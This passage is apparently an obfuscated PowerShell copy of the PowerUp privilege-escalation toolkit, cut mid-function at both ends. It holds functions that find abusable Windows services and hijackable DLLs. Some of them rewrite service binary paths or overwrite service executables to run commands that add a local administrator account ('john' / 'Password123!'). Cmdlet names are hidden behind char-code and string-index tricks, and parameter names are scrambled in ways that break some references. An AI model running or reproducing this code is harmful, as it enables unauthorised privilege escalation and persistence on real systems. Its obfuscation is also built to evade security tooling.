                $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'Path' $Mb58kYmonUGrhQ.pathname
                $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ModifiablePath' $_
                $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'StartName' $Mb58kYmonUGrhQ.startname
                $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'AbuseFunction' "Write-ServiceBinary -7GFj6Vi5MUh9X '$($Mb58kYmonUGrhQ.name)' -b3CtzFF8zYowylvWrqwrJZd <HijackPath>"
                $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'CanRestart' ([Bool]$CanRestartzeCYZgqvz3AZIv)
                $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Aliasproperty Name ServiceName
                $MZ8p5YquBs.PSObject.TypeNames.Insert(0, 'PowerUp.UnquotedService')
                $MZ8p5YquBs
            }
        }
    }
}


function Get-ModifiableServiceFile {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableServiceFile')]
    [CmdletBinding()]
    Param()

    Get-WMIObject -Class win32_service | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {$_ -and $_.pathname} | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {

        $jPMDgGwdyrFuXif = $_.name
        $R85EN = $_.pathname
        $16EKs5wPlGi3htDOM = $_.startname

        $R85EN | Get-ModifiablePath | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {
            $CanRestartzeCYZgqvz3AZIv = Test-ServiceDaclPermission -H0zpm3lIZ2L 'Restart' -7GFj6Vi5MUh9X $jPMDgGwdyrFuXif
            $MZ8p5YquBs = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject
            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ServiceName' $jPMDgGwdyrFuXif
            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'Path' $R85EN
            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ModifiableFile' $_.ModifiablePath
            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ModifiableFilePermissions' $_.Permissions
            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ModifiableFileIdentityReference' $_.IdentityReference
            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'StartName' $16EKs5wPlGi3htDOM
            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'AbuseFunction' "Install-ServiceBinary -7GFj6Vi5MUh9X '$jPMDgGwdyrFuXif'"
            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'CanRestart' ([Bool]$CanRestartzeCYZgqvz3AZIv)
            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Aliasproperty Name ServiceName
            $MZ8p5YquBs.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableServiceFile')
            $MZ8p5YquBs
        }
    }
}


function Get-ModifiableService {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ModifiableService')]
    [CmdletBinding()]
    Param()

    Get-Service | Test-ServiceDaclPermission -H0zpm3lIZ2L 'ChangeConfig' | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {
        $alJqCtQn87wYPBImEeh9A = $_ | Get-ServiceDetail
        $CanRestartzeCYZgqvz3AZIv = $_ | Test-ServiceDaclPermission -H0zpm3lIZ2L 'Restart'
        $MZ8p5YquBs = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject
        $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ServiceName' $alJqCtQn87wYPBImEeh9A.name
        $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'Path' $alJqCtQn87wYPBImEeh9A.pathname
        $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'StartName' $alJqCtQn87wYPBImEeh9A.startname
        $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'AbuseFunction' "Invoke-ServiceAbuse -7GFj6Vi5MUh9X '$($alJqCtQn87wYPBImEeh9A.name)'"
        $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'CanRestart' ([Bool]$CanRestartzeCYZgqvz3AZIv)
        $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Aliasproperty Name ServiceName
        $MZ8p5YquBs.PSObject.TypeNames.Insert(0, 'PowerUp.ModifiableService')
        $MZ8p5YquBs
    }
}


function Get-ServiceDetail {


    [OutputType('PowerUp.ModifiableService')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $7GFj6Vi5MUh9X
    )

    PROCESS {
        ForEach($abep4F in $7GFj6Vi5MUh9X) {
            $jcEgpX = Get-Service -7GFj6Vi5MUh9X $abep4F -ErrorAction Stop
            if ($jcEgpX) {
                Get-WmiObject -Class win32_service -Filter "Name='$($jcEgpX.Name)'" | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {$_} | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') {
                    try {
                        $_
                    }
                    catch {
                        & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Error: $_"
                    }
                }
            }
        }
    }
}








function Invoke-ServiceAbuse {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerUp.AbusedService')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String[]]
        [ValidateNotNullOrEmpty()]
        $7GFj6Vi5MUh9X,

        [ValidateNotNullOrEmpty()]
        [String]
        $MJNrf2Xbpio7GuhH = 'john',

        [ValidateNotNullOrEmpty()]
        [String]
        $IQ2MUGLwEkxjZ = 'Password123!',

        [ValidateNotNullOrEmpty()]
        [String]
        $nqCSfArl3vc6P = 'Administrators',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $n2cEADWJw = [Management.Automation.PSCredential]::Empty,

        [String]
        [ValidateNotNullOrEmpty()]
        $Dcg7PAwQMrbNMAn7ScBAec,

        [Switch]
        $xnW83q
    )

    BEGIN {

        if ($PSBoundParameters['Command']) {
            $ServiceCommandsjL = @($Dcg7PAwQMrbNMAn7ScBAec)
        }

        else {
            if ($PSBoundParameters['Credential']) {
                $v54tkmFsMU = $n2cEADWJw.UserName
                $B2CjIvcQF67Pb0rl = $n2cEADWJw.GetNetworkCredential().Password
            }
            else {
                $v54tkmFsMU = $MJNrf2Xbpio7GuhH
                $B2CjIvcQF67Pb0rl = $IQ2MUGLwEkxjZ
            }

            if ($v54tkmFsMU.Contains('\')) {
                
                $ServiceCommandsjL = @("net localgroup $nqCSfArl3vc6P $v54tkmFsMU /add")
            }
            else {
                
                $ServiceCommandsjL = @("net user $v54tkmFsMU $B2CjIvcQF67Pb0rl /add", "net localgroup $nqCSfArl3vc6P $v54tkmFsMU /add")
            }
        }
    }

    PROCESS {

        ForEach($abep4F in $7GFj6Vi5MUh9X) {

            $jcEgpX = Get-Service -7GFj6Vi5MUh9X $abep4F -ErrorAction Stop
            $alJqCtQn87wYPBImEeh9A = $jcEgpX | Get-ServiceDetail

            $DHuk0clw7OIt5oyhMvUZK6 = $False
            if ($alJqCtQn87wYPBImEeh9A.StartMode -match 'Disabled') {
                & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Service '$(ServiceDetails.Name)' disabled, enabling..."
                $jcEgpX | Set-Service -StartupType Manual -ErrorAction Stop
                $DHuk0clw7OIt5oyhMvUZK6 = $True
            }

            $nuuUiOU = $alJqCtQn87wYPBImEeh9A.PathName
            $vwIUWmzn6M9RZhxCGV2YBqr7k = $alJqCtQn87wYPBImEeh9A.State

            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Service '$($jcEgpX.Name)' original path: '$nuuUiOU'"
            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Service '$($jcEgpX.Name)' original state: '$vwIUWmzn6M9RZhxCGV2YBqr7k'"

            ForEach($X3FfRE in $ServiceCommandsjL) {

                if ($PSBoundParameters['Force']) {
                    $jcEgpX | Stop-Service -xnW83q -ErrorAction Stop
                }
                else {
                    $jcEgpX | Stop-Service -ErrorAction Stop
                }

                & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Executing command '$X3FfRE'"
                $2MIexk = $jcEgpX | Set-ServiceBinaryPath -b3CtzFF8zYowylvWrqwrJZd "$X3FfRE"

                if (-not $2MIexk) {
                    throw "Error reconfiguring the binary path for $($jcEgpX.Name)"
                }

                $jcEgpX | Start-Service -ErrorAction SilentlyContinue
                & ([string]::join('', ( (83,116,97,114,116,45,83,108,101,101,112) |%{ ( [char][int] $_)})) | % {$_}) -Seconds 2
            }

            if ($PSBoundParameters['Force']) {
                $jcEgpX | Stop-Service -xnW83q -ErrorAction Stop
            }
            else {
                $jcEgpX | Stop-Service -ErrorAction Stop
            }

            & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Restoring original path to service '$($jcEgpX.Name)'"
            & ([string]::join('', ( (83,116,97,114,116,45,83,108,101,101,112) |%{ ( [char][int] $_)})) | % {$_}) -Seconds 1
            $2MIexk = $jcEgpX | Set-ServiceBinaryPath -b3CtzFF8zYowylvWrqwrJZd "$nuuUiOU"

            if (-not $2MIexk) {
                throw "Error restoring the original binPath for $($jcEgpX.Name)"
            }

            
            if ($DHuk0clw7OIt5oyhMvUZK6) {
                & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Re-disabling service '$($jcEgpX.Name)'"
                $jcEgpX | Set-Service -StartupType Disabled -ErrorAction Stop
            }
            elseif ($vwIUWmzn6M9RZhxCGV2YBqr7k -eq "Paused") {
                & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Starting and then pausing service '$($jcEgpX.Name)'"
                $jcEgpX | Start-Service
                & ([string]::join('', ( (83,116,97,114,116,45,83,108,101,101,112) |%{ ( [char][int] $_)})) | % {$_}) -Seconds 1
                $jcEgpX | Set-Service -Status Paused -ErrorAction Stop
            }
            elseif ($vwIUWmzn6M9RZhxCGV2YBqr7k -eq "Stopped") {
                & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Leaving service '$($jcEgpX.Name)' in stopped state"
            }
            else {
                & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Restarting '$($jcEgpX.Name)'"
                $jcEgpX | Start-Service
            }

            $MZ8p5YquBs = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject
            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ServiceAbused' $jcEgpX.Name
            $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'Command' $($ServiceCommandsjL -join ' && ')
            $MZ8p5YquBs.PSObject.TypeNames.Insert(0, 'PowerUp.AbusedService')
            $MZ8p5YquBs
        }
    }
}


function Write-ServiceBinary {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerUp.ServiceBinary')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String]
        [ValidateNotNullOrEmpty()]
        $7GFj6Vi5MUh9X,

        [String]
        $MJNrf2Xbpio7GuhH = 'john',

        [String]
        $IQ2MUGLwEkxjZ = 'Password123!',

        [String]
        $nqCSfArl3vc6P = 'Administrators',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $n2cEADWJw = [Management.Automation.PSCredential]::Empty,

        [String]
        [ValidateNotNullOrEmpty()]
        $Dcg7PAwQMrbNMAn7ScBAec,

        [String]
        $b3CtzFF8zYowylvWrqwrJZd = "$(Convert-b3CtzFF8zYowylvWrqwrJZd .)\service.exe"
    )

    BEGIN {
        
        $ftejns = ""
        [Byte[]] $jtus2daxqBC61LIXPM = [Byte[]][Convert]::FromBase64String($ftejns)

        if ($PSBoundParameters['Command']) {
            $X3FfRE = $Dcg7PAwQMrbNMAn7ScBAec
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $v54tkmFsMU = $n2cEADWJw.UserName
                $B2CjIvcQF67Pb0rl = $n2cEADWJw.GetNetworkCredential().Password
            }
            else {
                $v54tkmFsMU = $MJNrf2Xbpio7GuhH
                $B2CjIvcQF67Pb0rl = $IQ2MUGLwEkxjZ
            }

            if ($v54tkmFsMU.Contains('\')) {
                
                $X3FfRE = "net localgroup $nqCSfArl3vc6P $v54tkmFsMU /add"
            }
            else {
                
                $X3FfRE = "net user $v54tkmFsMU $B2CjIvcQF67Pb0rl /add && timeout /t 5 && net localgroup $nqCSfArl3vc6P $v54tkmFsMU /add"
            }
        }
    }

    PROCESS {

        $jcEgpX = Get-Service -7GFj6Vi5MUh9X $7GFj6Vi5MUh9X

        
        $qI3fCda93mIaV74s2k0Gi = [System.Text.Encoding]::Unicode
        $AduotmF3cLX1ZkalfJWvEhSYC = $qI3fCda93mIaV74s2k0Gi.GetBytes($jcEgpX.Name)
        $6QLq23m9lo = $qI3fCda93mIaV74s2k0Gi.GetBytes($X3FfRE)

        
        for ($8iqF=0; $8iqF -lt ($AduotmF3cLX1ZkalfJWvEhSYC.Length); $8iqF++) {
            
            $jtus2daxqBC61LIXPM[$8iqF+2458] = $AduotmF3cLX1ZkalfJWvEhSYC[$8iqF]
        }
        for ($8iqF=0; $8iqF -lt ($6QLq23m9lo.Length); $8iqF++) {
            
            $jtus2daxqBC61LIXPM[$8iqF+2535] = $6QLq23m9lo[$8iqF]
        }

        & ([string]::join('', ( (83,101,116,45,67,111,110,116,101,110,116) |%{ ( [char][int] $_)})) | % {$_}) -Value $jtus2daxqBC61LIXPM -Encoding Byte -b3CtzFF8zYowylvWrqwrJZd $b3CtzFF8zYowylvWrqwrJZd -xnW83q -ErrorAction Stop

        $MZ8p5YquBs = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject
        $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ServiceName' $jcEgpX.Name
        $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'Path' $b3CtzFF8zYowylvWrqwrJZd
        $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'Command' $X3FfRE
        $MZ8p5YquBs.PSObject.TypeNames.Insert(0, 'PowerUp.ServiceBinary')
        $MZ8p5YquBs
    }
}


function Install-ServiceBinary {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerUp.ServiceBinary.Installed')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String]
        [ValidateNotNullOrEmpty()]
        $7GFj6Vi5MUh9X,

        [String]
        $MJNrf2Xbpio7GuhH = 'john',

        [String]
        $IQ2MUGLwEkxjZ = 'Password123!',

        [String]
        $nqCSfArl3vc6P = 'Administrators',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $n2cEADWJw = [Management.Automation.PSCredential]::Empty,

        [String]
        [ValidateNotNullOrEmpty()]
        $Dcg7PAwQMrbNMAn7ScBAec
    )

    BEGIN {
        if ($PSBoundParameters['Command']) {
            $X3FfRE = $Dcg7PAwQMrbNMAn7ScBAec
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $v54tkmFsMU = $n2cEADWJw.UserName
                $B2CjIvcQF67Pb0rl = $n2cEADWJw.GetNetworkCredential().Password
            }
            else {
                $v54tkmFsMU = $MJNrf2Xbpio7GuhH
                $B2CjIvcQF67Pb0rl = $IQ2MUGLwEkxjZ
            }

            if ($v54tkmFsMU.Contains('\')) {
                
                $X3FfRE = "net localgroup $nqCSfArl3vc6P $v54tkmFsMU /add"
            }
            else {
                
                $X3FfRE = "net user $v54tkmFsMU $B2CjIvcQF67Pb0rl /add && timeout /t 5 && net localgroup $nqCSfArl3vc6P $v54tkmFsMU /add"
            }
        }
    }

    PROCESS {
        $jcEgpX = Get-Service -7GFj6Vi5MUh9X $7GFj6Vi5MUh9X -ErrorAction Stop
        $alJqCtQn87wYPBImEeh9A = $jcEgpX | Get-ServiceDetail
        $Qj = $alJqCtQn87wYPBImEeh9A.PathName | Get-ModifiablePath -d41WGJ3bP2VD

        if (-not $Qj) {
            throw "Service binary '$($alJqCtQn87wYPBImEeh9A.PathName)' for service $($alJqCtQn87wYPBImEeh9A.Name) not modifiable by the current user."
        }

        $R85EN = $Qj | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -First 1 | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -ExpandProperty ModifiablePath
        $7jKwTBsol6gD9xSQY5tUCM = "$($R85EN).bak"

        & ([string]::join('', ( (87,114,105,116,101,45,86,101,114,98,111,115,101) |%{ ( [char][int] $_)})) | % {$_}) "Backing up '$R85EN' to '$7jKwTBsol6gD9xSQY5tUCM'"

        try {
            & (("ZuJDEtl0MfO3yzhw5arbevdFxWX1n6sqi7Q4NIpYAPGcmHgLUSRBkoT9-C8V2jK")[57,53,38,12,56,37,5,20,44] -join '') -b3CtzFF8zYowylvWrqwrJZd $R85EN -Destination $7jKwTBsol6gD9xSQY5tUCM -xnW83q
        }
        catch {
            & ([string]::join('', ( (87,114,105,116,101,45,87,97,114,110,105,110,103) |%{ ( [char][int] $_)})) | % {$_}) "Error backing up '$R85EN' : $_"
        }

        $U51iWlcYNSdtn0ML7 = Write-ServiceBinary -7GFj6Vi5MUh9X $alJqCtQn87wYPBImEeh9A.Name -Dcg7PAwQMrbNMAn7ScBAec $X3FfRE -b3CtzFF8zYowylvWrqwrJZd $R85EN
        $U51iWlcYNSdtn0ML7 | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'BackupPath' $7jKwTBsol6gD9xSQY5tUCM
        $U51iWlcYNSdtn0ML7.PSObject.TypeNames.Insert(0, 'PowerUp.ServiceBinary.Installed')
        $U51iWlcYNSdtn0ML7
    }
}


function Restore-ServiceBinary {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ServiceBinary.Restored')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String]
        [ValidateNotNullOrEmpty()]
        $7GFj6Vi5MUh9X,

        [Parameter(Position = 1)]
        [ValidateScript({& (("DIUV1jEJHGdXi4Bt7hsCmyrufLkeg95bSM0WxOw3czFNPZ6lKA-YaRpv8Qqo2Tn")[61,27,18,15,50,44,52,15,17] -join '') -b3CtzFF8zYowylvWrqwrJZd $_ })]
        [String]
        $7jKwTBsol6gD9xSQY5tUCM
    )

    PROCESS {
        $jcEgpX = Get-Service -7GFj6Vi5MUh9X $7GFj6Vi5MUh9X -ErrorAction Stop
        $alJqCtQn87wYPBImEeh9A = $jcEgpX | Get-ServiceDetail
        $Qj = $alJqCtQn87wYPBImEeh9A.PathName | Get-ModifiablePath -d41WGJ3bP2VD

        if (-not $Qj) {
            throw "Service binary '$($alJqCtQn87wYPBImEeh9A.PathName)' for service $($alJqCtQn87wYPBImEeh9A.Name) not modifiable by the current user."
        }

        $R85EN = $Qj | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -First 1 | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -ExpandProperty ModifiablePath
        $7jKwTBsol6gD9xSQY5tUCM = "$($R85EN).bak"

        & (("ZuJDEtl0MfO3yzhw5arbevdFxWX1n6sqi7Q4NIpYAPGcmHgLUSRBkoT9-C8V2jK")[57,53,38,12,56,37,5,20,44] -join '') -b3CtzFF8zYowylvWrqwrJZd $7jKwTBsol6gD9xSQY5tUCM -Destination $R85EN -xnW83q
        & ([string]::join('', ( (82,101,109,111,118,101,45,73,116,101,109) |%{ ( [char][int] $_)})) | % {$_}) -b3CtzFF8zYowylvWrqwrJZd $7jKwTBsol6gD9xSQY5tUCM -xnW83q

        $MZ8p5YquBs = & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) PSObject
        $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ServiceName' $alJqCtQn87wYPBImEeh9A.Name
        $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'ServicePath' $R85EN
        $MZ8p5YquBs | & ([string]::join('', ( (65,100,100,45,77,101,109,98,101,114) |%{ ( [char][int] $_)})) | % {$_}) Noteproperty 'BackupPath' $7jKwTBsol6gD9xSQY5tUCM
        $MZ8p5YquBs.PSObject.TypeNames.Insert(0, 'PowerUp.ServiceBinary.Restored')
        $MZ8p5YquBs
    }
}








function Find-ProcessDLLHijack {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.HijackableDLL.Process')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessName')]
        [String[]]
        $7GFj6Vi5MUh9X = $(& ([string]::join('', ( (71,101,116,45,80,114,111,99,101,115,115) |%{ ( [char][int] $_)})) | % {$_}) | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -Expand Name),

        [Switch]
        $bmMuNR7G,

        [Switch]
        $IoDI0,

        [Switch]
        $uwf
    )

    BEGIN {
        
        
        $izV = (& ([string]::join('', ( (71,101,116,45,73,116,101,109) |%{ ( [char][int] $_)})) | % {$_}) "HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs")
        $akJxXvUFXnd5eM4Bur3A2lCH = $(ForEach ($sqxLyS in $izV.GetValueNames()) { $izV.GetValue($sqxLyS).tolower() }) | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) { $_.EndsWith(".dll") }
        $6aphSKQCMBVNmOAn0gLJs = $(ForEach ($7GFj6Vi5MUh9X in $izV.GetValueNames()) { $izV.GetValue($7GFj6Vi5MUh9X).tolower() }) | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) { -not $_.EndsWith(".dll") }
        $akJxXvUFXnd5eM4Bur3A2lCH += ForEach ($b3CtzFF8zYowylvWrqwrJZd in $6aphSKQCMBVNmOAn0gLJs) { ls -xnW83q $b3CtzFF8zYowylvWrqwrJZd\*.dll | & ([string]::join('', ( (83,101,108,101,99,116,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) -ExpandProperty Name | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') { $_.tolower() }}
        $jtS5ONwrUKOE3HJYm = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

        
        $Io = @{}
        Get-WmiObject -Class win32_process | & ([string]::join('', ( (87,104,101,114,101,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_}) {$_} | & (("Y4nzSt7fiOucCIbLvHh-EWZKxsQUdperD9NJTmjR68akBV2MFX03AywGoPgq5l1")[48,56,31,20,42,11,18,19,9,14,38,30,11,5] -join '') { $Io[$_.handle] = $_.getowner().user }
    }

    PROCESS {

        ForEach ($6IlRnoeZvxSKziJOdjWD9 in $7GFj6Vi5MUh9X) {

            $KXgec8yY1FhSnfxwJBuvWizU = & ([string]::join('', ( (71,101,116,45,80,114,111,99,101,115,115) |%{ ( [char][int] $_)})) | % {$_}) -7GFj6Vi5MUh9X $6IlRnoeZvxSKziJOdjWD9

            if ($KXgec8yY1FhSnfxwJBuvWizU -and $KXgec8yY1FhSnfxwJBuvWizU.Path -and ($KXgec8yY1FhSnfxwJBuvWizU.Path -ne '') -and ($BpZKcilASnhDR0mHwzFy -ne $KXgec8yY1FhSnfxwJBuvWizU.Path)) {

                try {
                    $FJak5iN = $KXgec8yY1FhSnfxwJBuvWizU.Path | & ([string]::join('', ( (83,112,108,105,116,45,80,97,116,104) |%{ ( [char][int] $_)})) | % {$_}) -Parent
                    $FQdLCgLoKm5KUlxU = $KXgec8yY1FhSnfxwJBuvWizU.Modules
                    $Tyfr = $Io[$KXgec8yY1FhSnfxwJBuvWizU.Id.ToString()]

                    ForEach ($Module in $FQdLCgLoKm5KUlxU){

                        $fe5NX9cdxjHaF1QP3vqO0Mo = "$FJak5iN\$($Module.ModuleName)"

                        
